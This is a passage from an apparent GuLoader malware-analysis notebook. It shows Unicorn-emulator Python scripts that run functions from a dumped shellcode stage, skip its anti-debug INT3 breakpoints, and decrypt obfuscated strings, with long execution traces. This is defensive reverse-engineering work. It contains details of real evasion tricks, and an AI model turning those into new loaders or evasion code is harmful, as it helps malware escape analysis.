plugin for the version of guloader you are analyzing. . String Decryption . from ctypes import * import unicorn as uc import struct # This is just to print each instruction address as it&#39;s emulated def hook_call(uc_engine, mem_type, address, size): eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) print(f&quot;EIP: {hex(eip-0x10000)}&quot;) return True buf = open(&#39;/tmp/Guloader_stage_2.bin&#39;, &#39;rb&#39;).read() uc_engine = uc.Uc(uc.UC_ARCH_X86, uc.UC_MODE_32) STACK_ADDR = 0x900000 CODE_ADDR = 0x10000 # Load shellcode into mem uc_engine.mem_map(CODE_ADDR, 0x300000, uc.UC_PROT_ALL) uc_engine.mem_write(CODE_ADDR, buf) # Set shellcode entrypoint uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, CODE_ADDR) # Setup the stack memory uc_engine.mem_map(STACK_ADDR - 0x100000, 0x200000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_ESP, STACK_ADDR) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EBP, STACK_ADDR) # This is our hook just for fun hook1 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None) # Setup our arguments/buffers EAX_BUFF = 0x500000 uc_engine.mem_map(EAX_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EAX, EAX_BUFF) # This sort of works like a &#39;push&#39; to push the buffer address onto the stack EBP_BUFF = 0x600000 uc_engine.mem_map(EBP_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR, struct.pack(&#39;&lt;I&#39;,EBP_BUFF)) EDI_BUFF = 0x700000 uc_engine.mem_map(EDI_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EDI, EDI_BUFF) ARG_BUFF = 0x400000 uc_engine.mem_map(ARG_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR + 4, struct.pack(&#39;&lt;I&#39;,ARG_BUFF)) FN_START = 0X08A55 + CODE_ADDR FN_END = 0x08D3F + CODE_ADDR uc_engine.emu_start(FN_START, FN_END, 0, 0) #out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) . EIP: 0x8a55 EIP: 0x8a57 EIP: 0x8a59 EIP: 0x8a5d EIP: 0x8a63 EIP: 0x8a69 EIP: 0x8a6f EIP: 0x8a75 EIP: 0x8a77 EIP: 0x8a7d EIP: 0x8a80 EIP: 0x8a85 EIP: 0x8a8b EIP: 0x8a8d EIP: 0x8a90 EIP: 0x8a96 EIP: 0x8a98 EIP: 0x8a9e EIP: 0x8aa0 EIP: 0x8aa2 EIP: 0x8aa8 EIP: 0x8aae EIP: 0x8ab4 EIP: 0x8b0e EIP: 0x8b11 EIP: 0x8b17 EIP: 0x8b19 EIP: 0x8b1f EIP: 0x8b21 EIP: 0x8b27 EIP: 0x8b2d EIP: 0x8b30 EIP: 0x8b35 EIP: 0x8b39 EIP: 0x8b3b EIP: 0x8b40 EIP: 0x8b45 EIP: 0x8b47 EIP: 0x8b4c EIP: 0x8b4e EIP: 0x8b54 EIP: 0x8b56 EIP: 0x8b96 EIP: 0x8b9c EIP: 0x8ba2 EIP: 0x8ba8 EIP: 0x8baa EIP: 0x8bb0 EIP: 0x8bb2 EIP: 0x8bb5 EIP: 0x8bbb EIP: 0x8bbd EIP: 0x8bc3 EIP: 0x8bc9 EIP: 0x8bcc EIP: 0x8bce EIP: 0x8bd4 EIP: 0x8bd6 EIP: 0x8bdc EIP: 0x8be2 EIP: 0x8be8 EIP: 0x8bf2 EIP: 0x8bf4 EIP: 0x8bf7 EIP: 0x8c01 EIP: 0x8c0b EIP: 0x8c0d EIP: 0x8c10 EIP: 0x8c1a EIP: 0x8c1c EIP: 0x8c1e EIP: 0x8c1f EIP: 0x8c25 EIP: 0x8c1e EIP: 0x8c1f EIP: 0x8c25 EIP: 0x8c1e EIP: 0x8c1f EIP: 0x8c25 EIP: 0x8c27 EIP: 0x8c28 EIP: 0x8c2e EIP: 0x8c34 EIP: 0x8c36 EIP: 0x8c3c EIP: 0x8c3e EIP: 0x8c40 EIP: 0x8c46 EIP: 0x8c4c EIP: 0x8c56 EIP: 0x8c58 EIP: 0x8c62 EIP: 0x8c6c EIP: 0x8c6e EIP: 0x8c78 EIP: 0x8c7b EIP: 0x8c7e EIP: 0x8c7f EIP: 0x8c85 EIP: 0x8c7b EIP: 0x8c7e EIP: 0x8c7f EIP: 0x8c85 EIP: 0x8c7b EIP: 0x8c7e EIP: 0x8c7f EIP: 0x8c85 EIP: 0x8c87 EIP: 0x8c88 EIP: 0x8cda EIP: 0x8cdc EIP: 0x8ce2 EIP: 0x8ce3 EIP: 0x8ce5 EIP: 0x8ceb EIP: 0x8ced EIP: 0x8cf3 EIP: 0x8cf5 EIP: 0x8cf7 EIP: 0x8cfd EIP: 0x8d03 EIP: 0x8d0d EIP: 0x8d0f EIP: 0x8d19 EIP: 0x8d23 EIP: 0x8d2d EIP: 0x8d2f EIP: 0x8d32 EIP: 0x8d33 EIP: 0x8d39 EIP: 0x8d2f EIP: 0x8d32 EIP: 0x8d33 EIP: 0x8d39 EIP: 0x8d2f EIP: 0x8d32 EIP: 0x8d33 EIP: 0x8d39 EIP: 0x8d3b EIP: 0x8d3c . arg_buff_data = uc_engine.mem_read(ARG_BUFF, 0x1000) data_len = struct.unpack(&#39;&lt;I&#39;, arg_buff_data[:4])[0] data = arg_buff_data[4:4+data_len] print(data) . bytearray(b&#39;n x00M9 xd3 x1e n x8e xa4 xc5&gt; xea xf76 xf5t x07g xcd&#39;) . xor_crypt(data, key) . b&#39;SOFTWARE AppDataLow &#39; . from ctypes import * import unicorn as uc import struct # This is just to print each instruction address as it&#39;s emulated def hook_call(uc_engine, mem_type, address, size): eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) pretty_eip = hex(eip-0x10000) print(f&quot;EIP: {pretty_eip}&quot;) test = uc_engine.mem_read(eip, 2) if test[0] == 0xcc: print(f&quot;Breakpoint detected at {pretty_eip}&quot;) new_eip = (test[1] ^ 0x8F) + eip uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, new_eip) return True buf = open(&#39;/tmp/Guloader_stage_2.bin&#39;, &#39;rb&#39;).read() uc_engine = uc.Uc(uc.UC_ARCH_X86, uc.UC_MODE_32) STACK_ADDR = 0x900000 CODE_ADDR = 0x10000 # Load shellcode into mem uc_engine.mem_map(CODE_ADDR, 0x300000, uc.UC_PROT_ALL) uc_engine.mem_write(CODE_ADDR, buf) # Set shellcode entrypoint uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, CODE_ADDR) # Setup the stack memory uc_engine.mem_map(STACK_ADDR - 0x100000, 0x200000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_ESP, STACK_ADDR) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EBP, STACK_ADDR) # This is our hook just for fun hook1 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None) # Setup our arguments/buffers EAX_BUFF = 0x500000 uc_engine.mem_map(EAX_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EAX, EAX_BUFF) # This sort of works like a &#39;push&#39; to push the buffer address onto the stack EBP_BUFF = 0x600000 uc_engine.mem_map(EBP_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR, struct.pack(&#39;&lt;I&#39;,EBP_BUFF)) EDI_BUFF = 0x700000 uc_engine.mem_map(EDI_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EDI, EDI_BUFF) ARG_BUFF = 0x400000 uc_engine.mem_map(ARG_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR + 4, struct.pack(&#39;&lt;I&#39;,ARG_BUFF)) FN_START = 0x00017571 + CODE_ADDR FN_END = 0x0017A11 + CODE_ADDR uc_engine.emu_start(FN_START, FN_END, 0, 0) #out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) . EIP: 0x17571 Breakpoint detected at 0x17571 EIP: 0x17580 EIP: 0x17584 Breakpoint detected at 0x17584 EIP: 0x1758d EIP: 0x17593 Breakpoint detected at 0x17593 EIP: 0x17598 EIP: 0x1759e Breakpoint detected at 0x1759e EIP: 0x175a4 EIP: 0x175aa Breakpoint detected at 0x175aa EIP: 0x175ae EIP: 0x175b4 Breakpoint detected at 0x175b4 EIP: 0x175c3 EIP: 0x175cd EIP: 0x175d7 Breakpoint detected at 0x175d7 EIP: 0x175e8 Breakpoint detected at 0x175e8 EIP: 0x175fc EIP: 0x17606 EIP: 0x17610 Breakpoint detected at 0x17610 EIP: 0x17617 Breakpoint detected at 0x17617 EIP: 0x1761d EIP: 0x1761e EIP: 0x17624 EIP: 0x17617 Breakpoint detected at 0x17617 EIP: 0x1761d EIP: 0x1761e EIP: 0x17624 EIP: 0x17617 Breakpoint detected at 0x17617 EIP: 0x1761d EIP: 0x1761e EIP: 0x17624 EIP: 0x17626 Breakpoint detected at 0x17626 EIP: 0x17634 EIP: 0x17635 Breakpoint detected at 0x17635 EIP: 0x17641 EIP: 0x17647 Breakpoint detected at 0x17647 EIP: 0x17653 EIP: 0x17659 Breakpoint detected at 0x17659 EIP: 0x17661 Breakpoint detected at 0x17661 EIP: 0x17665 EIP: 0x1766b EIP: 0x17671 Breakpoint detected at 0x17671 EIP: 0x17678 Breakpoint detected at 0x17678 EIP: 0x17686 Breakpoint detected at 0x17686 EIP: 0x1768e EIP: 0x17694 Breakpoint detected at 0x17694 EIP: 0x176a2 EIP: 0x176a7 Breakpoint detected at 0x176a7 EIP: 0x176ad EIP: 0x176b3 Breakpoint detected at 0x176b3 EIP: 0x176c1 EIP: 0x176c7 Breakpoint detected at 0x176c7 EIP: 0x176db EIP: 0x176e1 EIP: 0x1772b Breakpoint detected at 0x1772b EIP: 0x17734 EIP: 0x17736 EIP: 0x1773c Breakpoint detected at 0x1773c EIP: 0x17744 Breakpoint detected at 0x17744 EIP: 0x1774e EIP: 0x17754 Breakpoint detected at 0x17754 EIP: 0x1775e EIP: 0x17764 Breakpoint detected at 0x17764 EIP: 0x17775 EIP: 0x1777b EIP: 0x17781 Breakpoint detected at 0x17781 EIP: 0x17785 EIP: 0x1778f Breakpoint detected at 0x1778f EIP: 0x17798 EIP: 0x177a2 Breakpoint detected at 0x177a2 EIP: 0x177b4 EIP: 0x177be EIP: 0x177c8 EIP: 0x177c9 EIP: 0x177cf EIP: 0x177c8 EIP: 0x177c9 EIP: 0x177cf EIP: 0x177c8 EIP: 0x177c9 EIP: 0x177cf EIP: 0x177d1 Breakpoint detected at 0x177d1 EIP: 0x177e6 EIP: 0x177e7 Breakpoint detected at 0x177e7 EIP: 0x177f5 Breakpoint detected at 0x177f5 EIP: 0x17809 EIP: 0x1780f Breakpoint detected at 0x1780f EIP: 0x1781e Breakpoint detected at 0x1781e EIP: 0x1782e EIP: 0x17834 Breakpoint detected at 0x17834 EIP: 0x17840 EIP: 0x17846 Breakpoint detected at 0x17846 EIP: 0x1784b Breakpoint detected at 0x1784b EIP: 0x1785c EIP: 0x17862 Breakpoint detected at 0x17862 EIP: 0x17871 Breakpoint detected at 0x17871 EIP: 0x1787a EIP: 0x17884 Breakpoint detected at 0x17884 EIP: 0x17897 EIP: 0x178a1 Breakpoint detected at 0x178a1 EIP: 0x178aa EIP: 0x178b4 Breakpoint detected at 0x178b4 EIP: 0x178c7 EIP: 0x178d1 Breakpoint detected at 0x178d1 EIP: 0x178e6 Breakpoint detected at 0x178e6 EIP: 0x178ef Breakpoint detected at 0x178ef EIP: 0x17903 Breakpoint detected at 0x17903 EIP: 0x17911 EIP: 0x17912 EIP: 0x17918 EIP: 0x17903 Breakpoint detected at 0x17903 EIP: 0x17911 EIP: 0x17912 EIP: 0x17918 EIP: 0x17903 Breakpoint detected at 0x17903 EIP: 0x17911 EIP: 0x17912 EIP: 0x17918 EIP: 0x1791a Breakpoint detected at 0x1791a EIP: 0x1792d EIP: 0x1792e Breakpoint detected at 0x1792e EIP: 0x1793b Breakpoint detected at 0x1793b EIP: 0x17949 EIP: 0x1794f Breakpoint detected at 0x1794f EIP: 0x1795f EIP: 0x17965 Breakpoint detected at 0x17965 EIP: 0x1797a Breakpoint detected at 0x1797a EIP: 0x17986 EIP: 0x1798c Breakpoint detected at 0x1798c EIP: 0x1799d EIP: 0x179a3 Breakpoint detected at 0x179a3 EIP: 0x179af EIP: 0x179b5 EIP: 0x179ba EIP: 0x179c0 EIP: 0x179c6 Breakpoint detected at 0x179c6 EIP: 0x179d8 EIP: 0x179de Breakpoint detected at 0x179de EIP: 0x179e7 Breakpoint detected at 0x179e7 EIP: 0x179ee EIP: 0x179f0 EIP: 0x179f6 Breakpoint detected at 0x179f6 EIP: 0x17a02 Breakpoint detected at 0x17a02 . arg_buff_data = uc_engine.mem_read(ARG_BUFF, 0x1000) data_len = struct.unpack(&#39;&lt;I&#39;, arg_buff_data[:4])[0] data = arg_buff_data[4:4+data_len] xor_crypt(data, key).decode(&#39;utf-16&#39;) . &#39;windir=&#39; . New and Improved Hook (Only for INT) . from ctypes import * import unicorn as uc import struct # This is just to print each instruction address as it&#39;s emulated def hook_int(uc_engine, interrupt_number, userdata): print(f&quot;INT {interrupt_number}&quot;) eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) -1 pretty_eip = hex(eip-0x10000) print(f&quot;EIP: {pretty_eip}&quot;) test = uc_engine.mem_read(eip, 2) if test[0] == 0xcc: print(f&quot;Breakpoint detected at {pretty_eip}&quot;) new_eip = (test[1] ^ 0x8F) + eip uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, new_eip) return True buf = open(&#39;/tmp/Guloader_stage_2.bin&#39;, &#39;rb&#39;).read() uc_engine = uc.Uc(uc.UC_ARCH_X86, uc.UC_MODE_32) STACK_ADDR = 0x900000 CODE_ADDR = 0x10000 # Load shellcode into mem uc_engine.mem_map(CODE_ADDR, 0x300000, uc.UC_PROT_ALL) uc_engine.mem_write(CODE_ADDR, buf) # Set shellcode entrypoint uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, CODE_ADDR) # Setup the stack memory uc_engine.mem_map(STACK_ADDR - 0x100000, 0x200000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_ESP, STACK_ADDR) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EBP, STACK_ADDR) # This is our hook just for fun hook1 = uc_engine.hook_add(uc.UC_HOOK_INTR, hook_int, None) # Setup our arguments/buffers EAX_BUFF = 0x500000 uc_engine.mem_map(EAX_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EAX, EAX_BUFF) # This sort of works like a &#39;push&#39; to push the buffer address onto the stack EBP_BUFF = 0x600000 uc_engine.mem_map(EBP_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR, struct.pack(&#39;&lt;I&#39;,EBP_BUFF)) EDI_BUFF = 0x700000 uc_engine.mem_map(EDI_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EDI, EDI_BUFF) ARG_BUFF = 0x400000 uc_engine.mem_map(ARG_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR + 4, struct.pack(&#39;&lt;I&#39;,ARG_BUFF)) FN_START = 0x00017571 + CODE_ADDR FN_END = 0x0017A11 + CODE_ADDR uc_engine.emu_start(FN_START, FN_END, 0, 0) #out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) . INT 3 EIP: 0x17571 Breakpoint detected at 0x17571 INT 3 EIP: 0x17584 Breakpoint detected at 0x17584 INT 3 EIP: 0x17593 Breakpoint detected at 0x17593 INT 3 EIP: 0x1759e Breakpoint detected at 0x1759e INT 3 EIP: 0x175aa Breakpoint detected at 0x175aa INT 3 EIP: 0x175b4 Breakpoint detected at 0x175b4 INT 3 EIP: 0x175d7 Breakpoint detected at 0x175d7 INT 3 EIP: 0x175e8 Breakpoint detected at 0x175e8 INT 3 EIP: 0x17610 Breakpoint detected at 0x17610 INT 3 EIP: 0x17617 Breakpoint detected at 0x17617 INT 3 EIP: 0x17617 Breakpoint detected at 0x17617 INT 3 EIP: 0x17617 Breakpoint detected at 0x17617 INT 3 EIP: 0x17626 Breakpoint detected at 0x17626 INT 3 EIP: 0x17635 Breakpoint detected at 0x17635 INT 3 EIP: 0x17647 Breakpoint detected at 0x17647 INT 3 EIP: 0x17659 Breakpoint detected at 0x17659 INT 3 EIP: 0x17661 Breakpoint detected at 0x17661 INT 3 EIP: 0x17671 Breakpoint detected at 0x17671 INT 3 EIP: 0x17678 Breakpoint detected at 0x17678 INT 3 EIP: 0x17686 Breakpoint detected at 0x17686 INT 3 EIP: 0x17694 Breakpoint detected at 0x17694 INT 3 EIP: 0x176a7 Breakpoint detected at 0x176a7 INT 3 EIP: 0x176b3 Breakpoint detected at 0x176b3 INT 3 EIP: 0x176c7 Breakpoint detected at 0x176c7 INT 3 EIP: 0x1772b Breakpoint detected at 0x1772b INT 3 EIP: 0x1773c Breakpoint detected at 0x1773c INT 3 EIP: 0x17744 Breakpoint detected at 0x17744 INT 3 EIP: 0x17754 Breakpoint detected at 0x17754 INT 3 EIP: 0x17764 Breakpoint detected at 0x17764 INT 3 EIP: 0x17781 Breakpoint detected at 0x17781 INT 3 EIP: 0x1778f Breakpoint detected at 0x1778f INT 3 EIP: 0x177a2 Breakpoint detected at 0x177a2 INT 3 EIP: 0x177d1 Breakpoint detected at 0x177d1 INT 3 EIP: 0x177e7 Breakpoint detected at 0x177e7 INT 3 EIP: 0x177f5 Breakpoint detected at 0x177f5 INT 3 EIP: 0x1780f Breakpoint detected at 0x1780f INT 3 EIP: 0x1781e Breakpoint detected at 0x1781e INT 3 EIP: 0x17834 Breakpoint detected at 0x17834 INT 3 EIP: 0x17846 Breakpoint detected at 0x17846 INT 3 EIP: 0x1784b Breakpoint detected at 0x1784b INT 3 EIP: 0x17862 Breakpoint detected at 0x17862 INT 3 EIP: 0x17871 Breakpoint detected at 0x17871 INT 3 EIP: 0x17884 Breakpoint detected at 0x17884 INT 3 EIP: 0x178a1 Breakpoint detected at 0x178a1 INT 3 EIP: 0x178b4 Breakpoint detected at 0x178b4 INT 3 EIP: 0x178d1 Breakpoint detected at 0x178d1 INT 3 EIP: 0x178e6 Breakpoint detected at 0x178e6 INT 3 EIP: 0x178ef Breakpoint detected at 0x178ef INT 3 EIP: 0x17903 Breakpoint detected at 0x17903 INT 3 EIP: 0x17903 Breakpoint detected at 0x17903 INT 3 EIP: 0x17903 Breakpoint detected at 0x17903 INT 3 EIP: 0x1791a Breakpoint detected at 0x1791a INT 3 EIP: 0x1792e Breakpoint detected at 0x1792e INT 3 EIP: 0x1793b Breakpoint detected at 0x1793b INT 3 EIP: 0x1794f Breakpoint detected at 0x1794f INT 3 EIP: 0x17965 Breakpoint detected at 0x17965 INT 3 EIP: 0x1797a Breakpoint detected at 0x1797a INT 3 EIP: 0x1798c Breakpoint detected at 0x1798c INT 3 EIP: 0x179a3 Breakpoint detected at 0x179a3 INT 3 EIP: 0x179c6 Breakpoint detected at 0x179c6 INT 3 EIP: 0x179de Breakpoint detected at 0x179de INT 3 EIP: 0x179e7 Breakpoint detected at 0x179e7 INT 3 EIP: 0x179f6 Breakpoint detected at 0x179f6 INT 3 EIP: 0x17a02 Breakpoint detected at 0x17a02 . arg_buff_data = uc_engine.mem_read(ARG_BUFF, 0x1000) data_len = struct.unpack(&#39;&lt;I&#39;, arg_buff_data[:4])[0] data = arg_buff_data[4:4+data_len] xor_crypt(data, key).decode(&#39;utf-16&#39;) . &#39;windir=&#39; . Add Code To Automatically Handle RET . from ctypes import * import unicorn as uc import struct # This is just to print each instruction address as it&#39;s emulated def hook_int(uc_engine, interrupt_number, userdata): print(f&quot;INT {interrupt_number}&quot;) eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) -1 pretty_eip = hex(eip-0x10000) print(f&quot;EIP: {pretty_eip}&quot;) test = uc_engine.mem_read(eip, 2) if test[0] == 0xcc: print(f&quot;Breakpoint detected at {pretty_eip}&quot;) new_eip = (test[1] ^ 0x8F) + eip uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, new_eip) return True buf = open(&#39;/tmp/Guloader_stage_2.bin&#39;, &#39;rb&#39;).read() uc_engine = uc.Uc(uc.UC_ARCH_X86, uc.UC_MODE_32) STACK_ADDR = 0x900000 CODE_ADDR = 0x10000 # Load shellcode into mem uc_engine.mem_map(CODE_ADDR, 0x300000, uc.UC_PROT_ALL) uc_engine.mem_write(CODE_ADDR, buf) # Set shellcode entrypoint uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, CODE_ADDR) # Setup the stack memory uc_engine.mem_map(STACK_ADDR - 0x100000, 0x200000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_ESP, STACK_ADDR) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EBP, STACK_ADDR) # This is our hook just for fun hook1 = uc_engine.hook_add(uc.UC_HOOK_INTR, hook_int, None) # Setup our arguments/buffers EAX_BUFF = 0x500000 uc_engine.mem_map(EAX_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EAX, EAX_BUFF) # This sort of works like a &#39;push&#39; to push the buffer address onto the stack EBP_BUFF = 0x600000 uc_engine.mem_map(EBP_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR, struct.pack(&#39;&lt;I&#39;,EBP_BUFF)) EDI_BUFF = 0x700000 uc_engine.mem_map(EDI_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EDI, EDI_BUFF) ARG_BUFF = 0x400000 uc_engine.mem_map(ARG_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR + 4, struct.pack(&#39;&lt;I&#39;,ARG_BUFF)) FN_START = 0x00017571 + CODE_ADDR # This is a trick to set a &quot;stop&quot; address FN_END = 0xDEADBEEF # Push the &quot;stop&quot; address onto the stack to trigger stop on return uc_engine.mem_write(STACK_ADDR, struct.pack(&#39;&lt;I&#39;,0xDEADBEEF)) uc_engine.emu_start(FN_START, FN_END, 0, 0) #out_eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) . INT 3 EIP: 0x17571 Breakpoint detected at 0x17571 INT 3 EIP: 0x17584 Breakpoint detected at 0x17584 INT 3 EIP: 0x17593 Breakpoint detected at 0x17593 INT 3 EIP: 0x1759e Breakpoint detected at 0x1759e INT 3 EIP: 0x175aa Breakpoint detected at 0x175aa INT 3 EIP: 0x175b4 Breakpoint detected at 0x175b4 INT 3 EIP: 0x175d7 Breakpoint detected at 0x175d7 INT 3 EIP: 0x175e8 Breakpoint detected at 0x175e8 INT 3 EIP: 0x17610 Breakpoint detected at 0x17610 INT 3 EIP: 0x17617 Breakpoint detected at 0x17617 INT 3 EIP: 0x17617 Breakpoint detected at 0x17617 INT 3 EIP: 0x17617 Breakpoint detected at 0x17617 INT 3 EIP: 0x17626 Breakpoint detected at 0x17626 INT 3 EIP: 0x17635 Breakpoint detected at 0x17635 INT 3 EIP: 0x17647 Breakpoint detected at 0x17647 INT 3 EIP: 0x17659 Breakpoint detected at 0x17659 INT 3 EIP: 0x17661 Breakpoint detected at 0x17661 INT 3 EIP: 0x17671 Breakpoint detected at 0x17671 INT 3 EIP: 0x17678 Breakpoint detected at 0x17678 INT 3 EIP: 0x17686 Breakpoint detected at 0x17686 INT 3 EIP: 0x17694 Breakpoint detected at 0x17694 INT 3 EIP: 0x176a7 Breakpoint detected at 0x176a7 INT 3 EIP: 0x176b3 Breakpoint detected at 0x176b3 INT 3 EIP: 0x176c7 Breakpoint detected at 0x176c7 INT 3 EIP: 0x1772b Breakpoint detected at 0x1772b INT 3 EIP: 0x1773c Breakpoint detected at 0x1773c INT 3 EIP: 0x17744 Breakpoint detected at 0x17744 INT 3 EIP: 0x17754 Breakpoint detected at 0x17754 INT 3 EIP: 0x17764 Breakpoint detected at 0x17764 INT 3 EIP: 0x17781 Breakpoint detected at 0x17781 INT 3 EIP: 0x1778f Breakpoint detected at 0x1778f INT 3 EIP: 0x177a2 Breakpoint detected at 0x177a2 INT 3 EIP: 0x177d1 Breakpoint detected at 0x177d1 INT 3 EIP: 0x177e7 Breakpoint detected at 0x177e7 INT 3 EIP: 0x177f5 Breakpoint detected at 0x177f5 INT 3 EIP: 0x1780f Breakpoint detected at 0x1780f INT 3 EIP: 0x1781e Breakpoint detected at 0x1781e INT 3 EIP: 0x17834 Breakpoint detected at 0x17834 INT 3 EIP: 0x17846 Breakpoint detected at 0x17846 INT 3 EIP: 0x1784b Breakpoint detected at 0x1784b INT 3 EIP: 0x17862 Breakpoint detected at 0x17862 INT 3 EIP: 0x17871 Breakpoint detected at 0x17871 INT 3 EIP: 0x17884 Breakpoint detected at 0x17884 INT 3 EIP: 0x178a1 Breakpoint detected at 0x178a1 INT 3 EIP: 0x178b4 Breakpoint detected at 0x178b4 INT 3 EIP: 0x178d1 Breakpoint detected at 0x178d1 INT 3 EIP: 0x178e6 Breakpoint detected at 0x178e6 INT 3 EIP: 0x178ef Breakpoint detected at 0x178ef INT 3 EIP: 0x17903 Breakpoint detected at 0x17903 INT 3 EIP: 0x17903 Breakpoint detected at 0x17903 INT 3 EIP: 0x17903 Breakpoint detected at 0x17903 INT 3 EIP: 0x1791a Breakpoint detected at 0x1791a INT 3 EIP: 0x1792e Breakpoint detected at 0x1792e INT 3 EIP: 0x1793b Breakpoint detected at 0x1793b INT 3 EIP: 0x1794f Breakpoint detected at 0x1794f INT 3 EIP: 0x17965 Breakpoint detected at 0x17965 INT 3 EIP: 0x1797a Breakpoint detected at 0x1797a INT 3 EIP: 0x1798c Breakpoint detected at 0x1798c INT 3 EIP: 0x179a3 Breakpoint detected at 0x179a3 INT 3 EIP: 0x179c6 Breakpoint detected at 0x179c6 INT 3 EIP: 0x179de Breakpoint detected at 0x179de INT 3 EIP: 0x179e7 Breakpoint detected at 0x179e7 INT 3 EIP: 0x179f6 Breakpoint detected at 0x179f6 INT 3 EIP: 0x17a02 Breakpoint detected at 0x17a02 . Final Automatic String Decryption . from ctypes import * import unicorn as uc import struct # This is just to print each instruction address as it&#39;s emulated def hook_int(uc_engine, interrupt_number, userdata): #print(f&quot;INT {interrupt_number}&quot;) eip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_EIP) -1 pretty_eip = hex(eip-0x10000) #print(f&quot;EIP: {pretty_eip}&quot;) test = uc_engine.mem_read(eip, 2) if test[0] == 0xcc: #print(f&quot;Breakpoint detected at {pretty_eip}&quot;) new_eip = (test[1] ^ 0x8F) + eip uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, new_eip) return True buf = open(&#39;/tmp/Guloader_stage_2.bin&#39;, &#39;rb&#39;).read() def decrypt(fn_address): uc_engine = uc.Uc(uc.UC_ARCH_X86, uc.UC_MODE_32) STACK_ADDR = 0x900000 CODE_ADDR = 0x10000 # Load shellcode into mem uc_engine.mem_map(CODE_ADDR, 0x300000, uc.UC_PROT_ALL) uc_engine.mem_write(CODE_ADDR, buf) # Set shellcode entrypoint uc_engine.reg_write(uc.x86_const.UC_X86_REG_EIP, CODE_ADDR) # Setup the stack memory uc_engine.mem_map(STACK_ADDR - 0x100000, 0x200000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_ESP, STACK_ADDR) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EBP, STACK_ADDR) # This is our hook just for fun hook1 = uc_engine.hook_add(uc.UC_HOOK_INTR, hook_int, None) # Setup our arguments/buffers EAX_BUFF = 0x500000 uc_engine.mem_map(EAX_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EAX, EAX_BUFF) # This sort of works like a &#39;push&#39; to push the buffer address onto the stack EBP_BUFF = 0x600000 uc_engine.mem_map(EBP_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR, struct.pack(&#39;&lt;I&#39;,EBP_BUFF)) EDI_BUFF = 0x700000 uc_engine.mem_map(EDI_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.reg_write(uc.x86_const.UC_X86_REG_EDI, EDI_BUFF) ARG_BUFF = 0x400000 uc_engine.mem_map(ARG_BUFF, 0x1000, uc.UC_PROT_ALL) uc_engine.mem_write(STACK_ADDR + 4, struct.pack(&#39;&lt;I&#39;,ARG_BUFF)) FN_START = fn_address + CODE_ADDR # This is a trick to set a &quot;stop&quot; address FN_END = 0xDEADBEEF # Push the &quot;stop&quot; address onto the stack to trigger stop on return uc_engine.mem_write(STACK_ADDR, struct.pack(&#39;&lt;I&#39;,0xDEADBEEF)) uc_engine.emu_start(FN_START, FN_END, 0, 0) # Read the data buffer arg_buff_data = uc_engine.mem_read(ARG_BUFF, 0x1000) data_len = struct.unpack(&#39;&lt;I&#39;, arg_buff_data[:4])[0] data = arg_buff_data[4:4+data_len] out = xor_crypt(data, key) return out.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;utf-8&#39;) . decrypt(0x147F1) . &#39;psapi.dll&#39; . IDA Script to Find Encrypted String Functions . We know that the string data function is the last function call before the string decryption function calls so we can just use xrefs to the decryption functions then search backwards for the string data function call. . def test2(): f = ida_funcs.get_func(0x08268980) fc = 